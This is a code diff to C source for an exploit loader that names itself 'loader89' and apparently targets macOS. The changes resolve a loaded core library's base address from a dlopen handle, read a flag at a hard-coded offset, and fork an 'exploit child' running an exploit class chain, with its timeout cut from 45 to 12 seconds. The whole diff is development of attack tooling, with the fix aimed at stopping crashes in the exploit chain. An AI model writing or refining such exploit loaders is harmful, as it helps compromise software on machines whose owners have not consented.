@@ -466,11 +466,16 @@ static void repair_core_log_sink(void *core) {
 }
 
 static int exploit_core_ok(void *core) {
+    /* dlopen() returns an opaque handle, not a Mach-O image base.
+       Reuse the v4.3/v4.4 resolver here as well; reading directly from
+       the handle caused SIGSEGV in the child exploit chain. */
     if (!core) return 0;
-    unsigned char *flag = (unsigned char *)core + 0x6b96d8;
+    unsigned char *base = 0;
+    if (!resolve_core_base(core, &base)) return 2;
+    unsigned char *flag = base + 0x6b96d8;
     int ok = (*flag == 0);
-    char msg[220];
-    snprintf(msg, sizeof(msg), "core flag addr=%p raw=%d ok=%d", (void *)flag, (int)*flag, ok);
+    char msg[300];
+    snprintf(msg, sizeof(msg), "core base=%p flag addr=%p raw=%d ok=%d", (void *)base, (void *)flag, (int)*flag, ok);
     log_info(msg);
     return ok;
 }
@@ -898,7 +903,7 @@ static void *worker(void *arg) {
         log_info(dm);
     }
 
-    log_info("=== loader89 v5.6 original-class-chain start ===");
+    log_info("=== loader89 v5.7 original-class-chain-safe start ===");
     read_runtime_config();
     char msg[600], bid[200];
     snprintf(msg, sizeof(msg), "runtime host=%s port=%d log=%s", g_host, g_port, g_logpath);
@@ -939,10 +944,10 @@ static void *worker(void *arg) {
             int rc = exploit_class_main(acqCls, core);
             _exit(rc);
         } else if (child > 0) {
-            snprintf(msg, sizeof(msg), "exploit child pid=%d timeout=45s", (int)child);
+            snprintf(msg, sizeof(msg), "exploit child pid=%d timeout=12s", (int)child);
             log_info(msg);
             int status = 0, finished = 0;
-            for (int i = 0; i < 45; i++) {
+            for (int i = 0; i < 12; i++) {
                 pid_t got = waitpid(child, &status, WNOHANG);
                 if (got == child) { finished = 1; break; }
                 sleep(1);
